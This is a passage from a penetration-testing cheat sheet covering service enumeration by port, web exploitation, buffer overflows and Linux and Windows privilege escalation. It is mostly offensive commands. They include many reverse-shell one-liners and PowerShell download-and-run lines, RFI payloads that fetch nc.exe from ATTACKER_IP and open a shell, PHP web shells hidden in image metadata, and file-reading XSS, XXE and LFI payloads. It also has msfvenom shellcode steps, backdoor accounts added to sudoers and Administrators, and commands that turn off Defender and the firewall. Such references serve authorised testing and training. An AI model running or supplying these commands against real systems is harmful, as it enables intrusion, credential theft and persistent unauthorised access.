| epmd-info:
|   epmd_port: 4369
|   nodes:
|     bigcouch: 11502
|     freeswitch: 8031
|     ecallmgr: 11501
|     kazoo_apps: 11500
|_    kazoo-rabbitmq: 25672

```

### Port 5353 / UDP - Multicast DNS (mDNS)

```bash
# Enumeration
nmap -Pn -sUC -p5353 192.168.1.2

Starting Nmap 6.46 (http://nmap.org) at 2015-01-01 10:30 GMT
Nmap scan report for 192.168.1.2
PORT     STATE SERVICE
5353/udp open  zeroconf

```

### Port 5432 / 5433 -  Postgresql

```bash
# Connect
psql -U <myuser> # Open psql console with user

# Remote connection
psql -h $IP -U <username> -d <database>
psql -h $IP -p <port> -U <username> -W <password> <database>

psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
#To read a file:
CREATE TABLE demo(t text);
COPY demo from '[FILENAME]';
SELECT * FROM demo;

# Enumeration
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection

```
### Port 5671 - AMQP

```python
import amqp
#By default it uses default credentials "guest":"guest"
conn = amqp.connection.Connection(host="<IP>", port=5672, virtual_host="/")
conn.connect()
for k, v in conn.server_properties.items():
    print(k, v)
```
```bash
# Automatic
nmap -sV -Pn -n -T4 -p 5672 --script amqp-info $IP
```

### Port 5985 / 5986 - WinRM

5985/tcp (HTTP)
5986/tcp (HTTPS)

```bash
gem install evil-winrm
evil-winrm -i $IP -u Administrator -p 'password1'
# Pass the hash with evil-winrm
evil-winrm -i $IP -u Administrator -H 'hash-pass'

```
Code extracted from here: https://alamot.github.io/winrm_shell/
```ruby
require 'winrm-fs'

# Author: Alamot
# To upload a file type: UPLOAD local_path remote_path
# e.g.: PS> UPLOAD myfile.txt C:\temp\myfile.txt


conn = WinRM::Connection.new(
  endpoint: 'https://IP:PORT/wsman',
  transport: :ssl,
  user: 'username',
  password: 'password',
  :no_ssl_peer_verification => true
)


class String
  def tokenize
    self.
      split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/).
      select {|s| not s.empty? }.
      map {|s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/,'')}
  end
end


command=""
file_manager = WinRM::FS::FileManager.new(conn)


conn.shell(:powershell) do |shell|
    until command == "exit\n" do
        output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
        print(output.output.chomp)
        command = gets
        if command.start_with?('UPLOAD') then
            upload_command = command.tokenize
            print("Uploading " + upload_command[1] + " to " + upload_command[2])
            file_manager.upload(upload_command[1], upload_command[2]) do |bytes_copied, total_bytes, local_path, remote_path|
                puts("#{bytes_copied} bytes of #{total_bytes} bytes copied")
            end
            command = "echo `nOK`n"
        end
        output = shell.run(command) do |stdout, stderr|
            STDOUT.print(stdout)
            STDERR.print(stderr)
        end
    end
    puts("Exiting with code #{output.exitcode}")
end
```

```
#Msf
msf > use auxiliary/scanner/winrm/winrm_login
    #Bruteforce
msf > use auxiliary/scanner/winrm/winrm_login
    #Running Commands
msf > use auxiliary/scanner/winrm/winrm_cmd
    #Getting Shells!
msf > use exploit/windows/winrm/winrm_script_exec

```

### VNC - 5800 / 5801 / 5900 / 5901 -  VNC

```bash
# Enumeration
nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p <PORT> $IP
msf> use auxiliary/scanner/vnc/vnc_none_auth

# Connect to vnc using Kali
vncviewer [-passwd passwd.txt] $IP::5901

```
### Port 5984 - CouchDB

```bash
# Enumeration
nmap -sV --script couchdb-databases,couchdb-stats -p 5984 $IP
msf> use auxiliary/scanner/couchdb/couchdb_enum

curl http://IP:5984/
# The reply should look something like:
{"couchdb":"Welcome","version":"0.10.1"}

```
References :
* https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html​

### Port 6000 - X11

```bash
# enumeration
nmap -sV --script x11-access -p 6000 $IP
msf> use auxiliary/scanner/x11/open_x11

# Remote Desktop View Way from:
https://resources.infosecinstitute.com/exploiting-x11-unauthenticated-access/#gref

# Get Shell
msf> use exploit/unix/x11/x11_keyboard_exec

```

### Redis - 6379

```bash
# Enumeration
nmap --script redis-info -sV -p 6379 $IP
msf> use auxiliary/scanner/redis/redis_server

https://github.com/Avinash-acid/Redis-Server-Exploit
python redis.py 10.10.10.160 redis

# redis-tools
sudo apt-get install redis-tools
redis-cli -h 192.168.0.24
192.168.0.24:6379> info
192.168.0.24:6379> CONFIG GET *
192.168.0.24:6379> keys *
192.168.0.24:6379> get 351115ba5f690fb9b1bdc1b41e673a94 #This is a key list on the last command

# auto exploit
redis-cli -h 192.168.0.24
192.168.0.24:6379> info
192.168.0.24:6379> CONFIG GET *
192.168.0.24:6379> keys *
192.168.0.24:6379> get 351115ba5f690fb9b1bdc1b41e673a94 #This is a key list on the last command

```
### Port 8009 - Apache JServ Protocol (AJP)
Basic Information :
From: https://diablohorn.com/2011/10/19/8009-the-forgotten-tomcat-port/
```bash
# Enumeration
nmap -sV --script ajp-auth,ajp-headers,ajp-methods,ajp-request -n -p 8009 $IP

```
### MsDeploy - 8172
Microsoft IIS Deploy port
```bash
$IP:8172/msdeploy.axd
```
### Webdav
```bash
davtest -cleanup -url http://$IP
cadaver http://$IP
```
### Port 9042 / 9160 -  Cassandra
```bash
#Enumeration
pip install cqlsh
cqlsh $IP
#Basic info enumeration
SELECT cluster_name, thrift_version, data_center, partitioner, native_protocol_version, rack, release_version from system.local;
#Keyspace enumeration
SELECT keyspace_name FROM system.schema_keyspaces;
desc <Keyspace_name>    #Decribe that DB
desc system_auth        #Describe the DB called system_auth
SELECT * from system_auth.roles;  #Retreive that info, can contain credential hashes
SELECT * from logdb.user_auth;    #Can contain credential hashes
SELECT * from logdb.user;
SELECT * from configuration."config";
# auto
nmap -sV --script cassandra-info -p 9042,9160 $IP

```

### Port 9100 - Raw Printing (JetDirect, AppSocket, PDL-datastream)
```bash
# Enumeration
nmap -sV --script pjl-ready-message -p <PORT> $IP
msf> use auxiliary/scanner/printer/printer_env_vars
msf> use auxiliary/scanner/printer/printer_list_dir
msf> use auxiliary/scanner/printer/printer_list_volumes
msf> use auxiliary/scanner/printer/printer_ready_message
msf> use auxiliary/scanner/printer/printer_version_info
msf> use auxiliary/scanner/printer/printer_download_file
msf> use auxiliary/scanner/printer/printer_upload_file
msf> use auxiliary/scanner/printer/printer_delete_file
```
[Printers Hacking tool](https://github.com/RUB-NDS/PRET)

### Port 9200 - Elasticsearch

Read this https://www.elastic.co/what-is/elasticsearch
```bash
# Enumeration
firefox http://$IP:9200/
```
You can gather all the indices accessing `http://10.10.10.115:9200/_cat/indices?v`
```sh
health status index   uuid                   pri rep docs.count docs.deleted store.size pri.store.size
green  open   .kibana 6tjAYZrgQ5CwwR0g6VOoRg   1   0          1            0        4kb            4kb
yellow open   quotes  ZG2D1IqkQNiNZmi2HRImnQ   5   1        253            0    262.7kb        262.7kb
yellow open   bank    eSVpNfCfREyYoVigNWcrMw   5   1       1000            0    483.2kb        483.2kb

```
... in build

### Port  10000 - Network Data Management Protocol (ndmp)

```bash
# Enumeration
nmap -n -sV --script "ndmp-fs-info or ndmp-version" -p 10000 $IP

```

### Port 11211 - Memcache

To ex-filtrate all the information saved inside a memcache instance you need to:
1 ) Find slabs with active items
2 ) Get the key names of the slabs detected before
3 ) Ex-filtrate the saved data by getting the key names

```bash
echo "version" | nc -vn $IP 11211      #Get version
echo "stats" | nc -vn $IP 11211        #Get status
echo "stats slabs" | nc -vn $IP 11211  #Get slabs
echo "stats items" | nc -vn $IP 11211  #Get items of slabs with info
echo "stats cachedump <number> 0" | nc -vn $IP 11211  #Get key names
echo "get <item_name>" | nc -vn $IP 11211  #Get saved info

#This php will just dumo the keys, you need to use "get <item_name> later"
sudo apt-get install php-memcached
php -r '$c = new Memcached(); $c->addServer("localhost", 11211); var_dump( $c->getAllKeys() );'

# auto mode ;)
nmap -n -sV --script memcached-info -p 11211 $IP   #Just gather info
msf > use auxiliary/gather/memcached_extractor      #Extracts saved data
msf > use auxiliary/scanner/memcached/memcached_amp #Check is UDP DDoS amplification attack is possible

```

### Port 15672 - RabbitMQ Management

[management plugin](https://www.rabbitmq.com/management.html)

The default credentials are "guest":"guest"
```bash
# Enumeration
rabbitmq-plugins enable rabbitmq_management
service rabbitmq-server restart

```

### Port 27017 / 27018 - MongoDB

```python
from pymongo import MongoClient
client = MongoClient(host, port, username=username, password=password)
client.server_info() #Basic info
#If you have admin access you can obtain more info
admin = client.admin
admin_info = admin.command("serverStatus")
cursor = client.list_databases()
for db in cursor:
    print(db)
    print(client[db["name"]].list_collection_names())
#If admin access, you could dump the database also
```

```bash
# Some MongoDB commnads:
show dbs
use <db>
show collections
db.<collection>.find()  #Dump the collection
db.<collection>.count() #Number of records of the collection
db.current.find({"username":"admin"})  #Find in current db the username admin

# Automatic
nmap -sV --script "mongo* and default" -p 27017 $IP

# Login
mongo $IP
mongo $IP:<PORT>
mongo $IP:<PORT>/<DB>
mongo <database> -u <username> -p '<password>'

nmap -n -sV --script mongodb-brute -p 27017 $IP

# Look inside /opt/bitnami/mongodb/mongodb.conf to know if credentials are needed:
grep "noauth.*true" /opt/bitnami/mongodb/mongodb.conf | grep -v "^#" #Not needed
grep "auth.*true" /opt/bitnami/mongodb/mongodb.conf | grep -v "^#\|noauth" #Not needed

```

### Port 44818 / UDP / TCP - EthernetIP

en.wikipedia.org/wiki/EtherNet/IP
```bash
# Enumeration
nmap -n -sV --script enip-info -p 44818 $IP
pip3 install cpppo
python3 -m cpppo.server.enip.list_services [--udp] [--broadcast] --list-identity -a $IP
```

### Port 47808 / udp - BACNet

```bash
# Enumeration
pip3 install BAC0
import BAC0
bbmdIP = '$IP:47808'
bbmdTTL = 900
bacnet = BAC0.connect(bbmdAddress=bbmdIP, bbmdTTL=bbmdTTL) #Connect
bacnet.vendorName.strValue

# Or just use nmap
nmap --script bacnet-info --script-args full=yes -sU -n -sV -p 47808 $IP

```

### Port 50030 / 50060 / 50070 / 50075 / 50090 - Hadoop

Basic Information

Apache Hadoop is an open source framework supporting the distributed storage and processing of large datasets using computer clusters.
Storage is handled by the Hadoop Distributed File System (HDFS) and processing is performed by using MapReduce and other applications (e.g., Apache Storm, Flink, and Spark) via YARN.

### Unknown ports
```bash
amap -d $IP 8000

# netcat: makes connections to ports. Can echo strings or give shells:

nc -nv $IP 110

```
* Try zone transfer for subdomains:

```bash
dig axfr @$IP hostname.box
dnsenum $IP
dnsrecon -d domain.com -t axfr

```

### Port 80 - web server

* Navigate && robots.txt &&sitemap.xml :smirk:
* Headers
* Source Code

```bash
# Server Version (Vulnerable?)
whatweb -a 1 <URL> #Stealthy
whatweb -a 3 <URL> #Aggresive
webtech -u <URL>

# Nikto
nikto -h http://$ip

# CMS Explorer
cms-explorer -url http://$IP -type [Drupal, WordPress, Joomla, Mambo]

# WPScan (vp = Vulnerable Plugins, vt = Vulnerable Themes, u = Users)
wpscan --url http://$IP
wpscan --url http://$IP --enumerate vp
wpscan --url http://$IP --enumerate vt
wpscan --url http://$IP --enumerate u
wpscan -e --url https://url.com

# Enum User:

for i in {1..50}; do curl -s -L -i https://ip.com/wordpress\?author=$i | grep -E -o "Location:.*" | awk -F/ '{print $NF}';done

# Joomscan
joomscan -u  http://$IP
joomscan -u  http://$IP --enumerate-components

# Get header
curl -i $IP

# Get options
curl -i -X OPTIONS $IP

# Get everything
curl -i -L $IP
curl -i -H "User-Agent:Mozilla/4.0" http://$IP:8080

# Check for title and all links
curl $IP -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'

# Look at page with just text
curl $IP -s -L | html2text -width '99' | uniq

# Check if it is possible to upload
curl -v -X OPTIONS http://$IP/
curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://$IP/test/shell.php

# Simple curl POST request with login data
curl -X POST http://10.11.1.11/centreon/api/index.php?action=authenticate -d 'username=centreon&password=wall'

# Google Dork

site:domain.com intext:user

https://github.com/sushiwushi/bug-bounty-dorks
```

#### Url Brutforce

```bash
# Ffuf
ffuf -c -e '.htm','.php','.html' -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u https://$IP/FUZZ

# Dirb not recursive
dirb http://$IP -r -o dirb-$IP.txt

# Wfuzz
wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://$IP/FUZZ

gobuster dir -u http://$IP -w /usr/share/seclists/Discovery/Web_Content/common.txt -x php -e # add -k for https

# dirseache
git clone https://github.com/maurosoria/dirsearch.git
cd dirsearch
./dirsearch.py -u http://$IP -e php,txt,html -x 404
./dirsearch.py -r -f -u https://google.com --extensions=htm,html,asp,aspx,txt -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 40

# Crawl:
dirhunt https://url.com/
hakrwaler https://url.com/

# Sub domain brut
https://github.com/aboul3la/Sublist3r

```
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Subdomains%20Enumeration.md

#### Default_Weak login
```bash

site:domain.com password

admin admin
admin password
admin <blank>
admin <servicename>
root root
root admin
root password
root <servicename>
<username if you have> password
<username if you have> admin
<username if you have> username
username <servicename>

```
> list of user names

https://github.com/danielmiessler/SecLists/tree/master/Usernames

#### LFI-RFI

```bash
#Fimap
fimap -u "http://$IP/example.php?test="

curl -s http://$IP/gallery.php?page=/etc/passwd

#Use in "page="

php://filter/convert.base64-encode/resource=/etc/passwd

http://$IP/maliciousfile.txt%00

php://filter/convert.base64-encode/resource=../config.php

php://filter/convert.base64-encode/resource=../../../../../boot.ini

# LFI Windows  :warning:
LANG=../../windows/system32/drivers/etc/hosts%00
LANG=../../xampp/apache/logs/access.log%00&cmd=ipconfig

# Contaminating log files
root@kali:~# nc -v $IP 80
$IP: inverse host lookup failed: Unknown host
(UNKNOWN) [$IP] 80 (http) open
 <?php echo shell_exec($_GET['cmd']);?>

# Contaminating log files
[root:~]# nc -v $IP 80
$IP: inverse host lookup failed: Unknown host
(UNKNOWN) [$IP] 80 (http) open
 <?php echo shell_exec($_GET['cmd']);?>

# RFI:
http://$IP/addguestbook.php?LANG=http://$IP:31/evil.txt%00
Content of evil.txt:
<?php echo shell_exec("nc.exe 10.11.0.105 4444 -e cmd.exe") ?>

# PHP Filter:
http://$IP/index.php?m=php://filter/convert.base64-encode/resource=config

# RFI over SMB (Windows)
cat php_cmd.php
    <?php echo shell_exec($_GET['cmd']);?>
  Start SMB Server in attacker machine and put evil script
  Access it via browser (2 request attack):
lang=\\ATTACKER_IP\ica\php_cmd.php&cmd=powershell -c Invoke-WebRequest -Uri "http://10.10.14.42/nc.exe" -OutFile "C:\\windows\\system32\\spool\\drivers\\color\\nc.exe"
lang=\\ATTACKER_IP\ica\php_cmd.php&cmd=powershell -c "C:\\windows\\system32\\spool\\drivers\\color\\nc.exe" -e cmd.exe ATTACKER_IP 1234

```
> read this :
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion

#### Sql-injection

```bash
#POST
sqlmap.py -r search-test.txt

#GET
sqlmap -u "http://$IP/index.php?id=1" --dbms=mysql

#FULL ;)
sqlmap -u 'http://$IP:1337/978345210/index.php' --forms --dbs --risk=3 --level=5 --threads=4 --batch

# NoSQL
' || 'a'=='a

#in URL
username[$ne]=0xtz&password[$ne]=0xtz  # :joy: i'm never use this user name

#in JSON
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$gt":""}, "password": {"$gt":""}}

```

[sql-injection-authentication-bypass-cheat-sheet](https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/)
[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

#### XSS
```javascript
<script>alert("XSS")</script>
<script>alert(1)</script>

" <script> x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText.fontsize(1)) }; x.open("GET","file:///home/reader/.ssh/id_rsa"); x.send(); </script>

" <script> x=new XMLHttpRequest; x.onload=function(){ document.write(this.responseText) }; x.open("GET","file:///etc/passwd"); x.send(); </script>

# XXE

XML entry that reads server, Doctype, change to entity "System "file:///etc/passwd""

#Instead POST:

<?xml version="1.0" ?>
    <!DOCTYPE thp [
        <!ELEMENT thp ANY>
        <!ENTITY book "Universe">
    ]>
    <thp>hack  &book;</thp>


#Malicious XML:

<?xml version="1.0" ?><!DOCTYPE thp [ <!ELEMENT thp ANY>
<!ENTITY book SYSTEM "file:///etc/passwd">]><thp>Hack
%26book%3B</thp>

```
#### Sql-login Bypass

>Open Burp-suite
Make and intercept a request
Send to intruder
Cluster attack.
Paste in sqlibypass-list
    https://bobloblaw.gitbooks.io/security/content/sql-injections.html
Attack
Check for response length variation

#### Bypass img Upload

```bash
Change extension: .pHp3 or pHp3.jpg
Modify mimetype: Content-type: image/jpeg
Bypass getimagesize(): exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' file.jpg
Add gif header: GIF89a;
All at the same time.
# inject PHP into img

exiv2 -c'A "<?php system($_REQUEST['cmd']);?>"!' shell.jpeg

exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' shell.jpg

```

#Online crackers

https://hashkiller.co.uk/Cracker
https://www.cmd5.org/
https://www.onlinehashcrack.com/
https://gpuhash.me/
https://crackstation.net/
https://crack.sh/
https://hash.help/
https://passwordrecovery.io/
http://cracker.offensive-security.com/

#### Vulnerability analysis

## Buffer Overflow
```bash
# BASIC GUIDE
1. Send "A"*1024
2. Replace "A" with /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l LENGTH
3. When crash "!mona findmsp" (E$IP offset) or ""/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q TEXT" or "!mona pattern_offset eip"
4. Confirm the location with "B" and "C"
5. Check for badchars instead CCCC (ESP):
badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10" "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
... )
with script _badchars.py and
"!mona compare -a esp -f C:\Users\IEUser\Desktop\badchar_test.bin"
 5.1 AWESOME WAY TO CHECK BADCHARS ( https://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/ ):
    a. !mona config -set workingfolder c:\logs\%p
    b. !mona bytearray -b "\x00\x0d"
    c. Copy from c:\logs\%p\bytearray.txt to python exploit and run again
    d. !mona compare -f C:\logs\%p\bytearray.bin -a 02F238D0 (ESP address)
    e. In " data", before unicode chars it shows badchars.
 6. Find JMP ESP with "!mona modules" or "!mona jmp -r esp" or "!mona jmp -r esp -cpb '\x00\x0a\x0d'" find one with security modules "FALSE"
6.1 Then, "!mona find -s "\xff\xe4" -m PROGRAM/DLL-FALSE"
6.2 Remember put the JMP ESP location in reverse order due to endianness: 5F4A358F will be \x8f\x35\x4a\x5f


7. Generate shellcode and place it:
msfvenom -p windows/shell_reverse_tcp LHOST=$IP LPORT=4433 -f python –e x86/shikata_ga_nai -b "\x00"

msfvenom -p windows/shell_reverse_tcp lhost=$IP lport=443 EXITFUNC=thread -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -f python -v shellcode

8. Final buffer like:
buffer="A"*2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode


```
## Find xploits - Searchsploit and google
```bash
#Google
site:exploit-db.com apache 2.X.X

searchsploit Apache 2.X.X
searchsploit Apache | grep -v '/dos/' | grep -vi "tomcat"

```

## Reverse Sells
```bash
# Linux
bash -i >& /dev/tcp/$IP/4443 0>&1

/bin/sh -i > /dev/tcp/x.x.x.x/6969 0<&1 2>&1

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP 4443 >/tmp/f

nc -e /bin/sh $IP 4443

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.9 4433 >/tmp/f')-1\

# Perl
perl -e 'use Socket;$i="$IP";$p=4443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Windows
nc -e cmd.exe $IP 4443

# from cmd
C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://x.x.x.x/Invoke-PowerShellTcp.ps1')

# PowerShell
PS C:\>IEX(New-Object Net.WebClient).downloadString('http://x.x.x.x/Invoke-PowerShellTcp.ps1')


# PHP
<?php $sock = fsockopen("$IP",1234); $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);?>

php -r '$sock=fsockopen("x.x.x.x",6969);exec("/bin/sh -i <&3 >&3 2>&3");'

ruby -rsocket -e'f=TCPSocket.open("x.x.x.x",6969).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

#OR use rsg

https://github.com/mthbernardes/rsg
rsg <interface> <port>

```
# Privilege escalation

## Common

### Set up Webserver
```bash
python -m SimpleHTTPServer 80
python3 -m http.server
ruby -r webrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start"
php -S 0.0.0.0:80
https://github.com/sc0tfree/updogupdog

```
```python
import SimpleHTTPServer
import SocketServer
PORT = 8000
Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
httpd = SocketServer.TCPServer(("", PORT), Handler)
print "serving at port", PORT
httpd.serve_forever()

```

### Set up FTP Server

```bash
# Install pyftpdlib
pip install pyftpdlib

# Run (-w flag allows anonymous write access)
python -m pyftpdlib -p 21 -w

```
### Filet ransfer
```bash
#On sending machine
nc -w 3 [destination] 1234 < send.file

#on receiving end:
cmd /c nc.exe -l -v -p 1234 > PsExec.exe

```
## Linux
* Useful commands
```bash
# Spawning shell
python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/sh")'
V
Ctrl+Z
stty raw -echo
fg
reset
Ctrl+Z
stty size
stty -rows 48 -columns 120
fg

echo os.system('/bin/bash')
/bin/sh -i
perl -e 'exec "/bin/sh";'
perl: exec "/bin/sh";
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')
(From within vi)
:!bash
:set shell=/bin/bash:shell
(From within nmap)
!sh

# Access to more binaries
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Set up webserver
cd /opt/privesc-scripts; python -m SimpleHTTPServer 80

# Download all files
wget http://$IP:8080/ -r; mv $IP exploits; cd exploits; rm index.html; chmod 700 LinEnum.sh linprivchecker.py unix-privesc-check

./LinEnum.sh -t -k password -r LinEnum.txt
python linprivchecker.py extended
./unix-privesc-check standard

# Writable directories
/tmp
/var/tmp

# Add user to sudoers
useradd hacker
passwd hacker
echo "hacker ALL=(ALL:ALL) ALL" >> /etc/sudoers

```

### Basic info
```bash
uname -a
env
id
cat /proc/version
cat /etc/issue
cat /etc/passwd
cat /etc/group
cat /etc/shadow
cat /etc/hosts

# Users with login
grep -vE "nologin" /etc/passwd

# Priv Enumeration Scripts
upload /unix-privesc-check
upload linuxprivchecker.py
upload LinEnum.sh

python linprivchecker.py extended
./LinEnum.sh -t -k password
unix-privesc-check

```
### Kernel exploits
```bash
site:exploit-db.com kernel version

perl /opt/Linux_Exploit_Suggester/Linux_Exploit_Suggester.pl -k 2.6

python linprivchecker.py extended

```
### Programs running as root
```bash
ps aux

```
### Installed software
```bash
/usr/local/
/usr/local/src
/usr/local/bin
/opt/
/home
/var/
/usr/src/

# Debian
dpkg -l

# CentOS, OpenSuse, Fedora, RHEL
rpm -qa (CentOS / openSUSE )

# OpenBSD, FreeBSD
pkg_info

```
### Weak/reused/plaintext passwords
* Check database config-file
* Check databases
* Check weak passwords
```bash
username:username
username:username1
username:root
username:admin
username:qwerty
username:password
```
```bash
./LinEnum.sh -t -k password
```
### Inside service
```bash
netstat -anlp
netstat -ano
```
### Suid misconfiguration

 - Binary with suid permission can be run by anyone, but when they are run they are run as root!
```bash
nmap
vim
nano
curl
...
```
```bash
# SUID
find / -perm -4000 -type f 2>/dev/null

# ALL PERMS
find / -perm -777 -type f 2>/dev/null

# SUID for current user
find / perm /u=s -user `whoami` 2>/dev/null
find / -user root -perm -4000 -print 2>/dev/null

# Writables for current user/group
find / perm /u=w -user `whoami` 2>/dev/null
find / -perm /u+w,g+w -f -user `whoami` 2>/dev/null
find / -perm /u+w -user `whoami` 2>/dev/nul

# Dirs with +w perms for current u/g
find / perm /u=w -type -d -user `whoami` 2>/dev/null
find / -perm /u+w,g+w -d -user `whoami` 2>/dev/null
```
### Unmounted filesystems
```bash
mount -l
```
### Cronjob
```bash
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root

```
### SSH Keys
 * Chek all home dirs
```bash
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key

```
### Bad path configuration
```bash
# Require user interaction
export PATH=/tmp' or your path file':$PATH

```
### Find plain passwords
```bash
grep -rnw '/' -ie 'pass' --color=always
grep -rnw '/' -ie 'DB_PASS' --color=always
grep -rnw '/' -ie 'DB_PASSWORD' --color=always
grep -rnw '/' -ie 'DB_USER' --color=always
```
### Scripts
#### SUID
```bash
int main(void){
  setresuid(0, 0, 0);
  system("/bin/bash");
}

# Compile
gcc suid.c -o suid
```
#### PS Monitor for cron
```bash
#!/bin/bash

# Loop by line
IFS=$'\n'

old_process=$(ps -eo command)

while true; do
    new_process=$(ps -eo command)
    diff <(echo "$old_process") <(echo "$new_process") | grep [\<\>]
    sleep 1
    old_process=$new_process
done
```
#### Linux Privesc Tools

[GTFOBins](https://gtfobins.github.io/)
[LinEnum](https://github.com/rebootuser/LinEnum)
[LinuxExploitSuggester](https://github.com/mzet-/linux-exploit-suggester)

### Linux Precompiled Exploits
[linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker)
## Windows

* Now we start the whole enumeration-process over gain. This is a checklist. You need to check of every single one, in this order.

1 ) Kernel exploits
2 ) Cleartext password
3 ) Reconfigure service parameters
4 ) Inside service
5 ) Program running as root
6 ) Installed software
7 ) Scheduled tasks
8 ) Weak passwords

### Basic info
```cmd
systeminfo
set
hostname
net users
net user user1
net localgroups
accesschk.exe -uwcqv "Authenticated Users" *

netsh firewall show state
netsh firewall show config

# Set path
set PATH=%PATH%;C:\xampp\php

whoami /priv

dir/a -> Show hidden & unhidden files
dir /Q -> Show permissions
```
### Kernel exploits
```cmd
# Look for hotfixes
systeminfo

wmic qfe get Caption,Description,HotFixID,InstalledOn

# Search for exploits
site:exploit-db.com windows XX XX
```
### Cleartext passwords
```cmd
# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# SNMP Parameters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```
### Reconfigure service parameters
*  Unquoted service paths

* Weak service permissions

https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/

### Dump process for passwords
```bash
# Looking for Firefox
Get-Process
./procdump64.exe -ma $PID-FF
Select-String -Path .\*.dmp -Pattern 'password' > 1.txt
type 1.txt | findstr /s /i "admin"
```
### Inside service
```cmd
netstat /a
netstat -ano
```
### Programs running as root/system

### Installed software
```cmd
tasklist /SVC
net start
reg query HKEY_LOCAL_MACHINE\SOFTWARE
DRIVERQUERY

Look in:
C:\Program files
C:\Program files (x86)
Home directory of the user
```
### Scheduled tasks
```cmd
schtasks /query /fo LIST /v

Check this file:
c:\WINDOWS\SchedLgU.Txt
```
### Weak passwords
```cmd
ncrack -vv --user george -P /usr/.../passwords.txt rdp://$IP
```
### Add user and enable RDP
```cmd
# Add new user

net user haxxor Haxxor123 /add
net localgroup Administrators haxxor /add
net localgroup "Remote Desktop Users" haxxor /ADD

# Turn firewall off and enable RDP

sc stop WinDefend
netsh advfirewall show allprofiles
netsh advfirewall set allprofiles state off
netsh firewall set opmode disable
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```
### Powershell sudo for Windows
```bash
$pw= convertto-securestring "EnterPasswordHere" -asplaintext -force
$pp = new-object -typename System.Management.Automation.PSCredential -argumentlist "EnterDomainName\EnterUserName",$pw
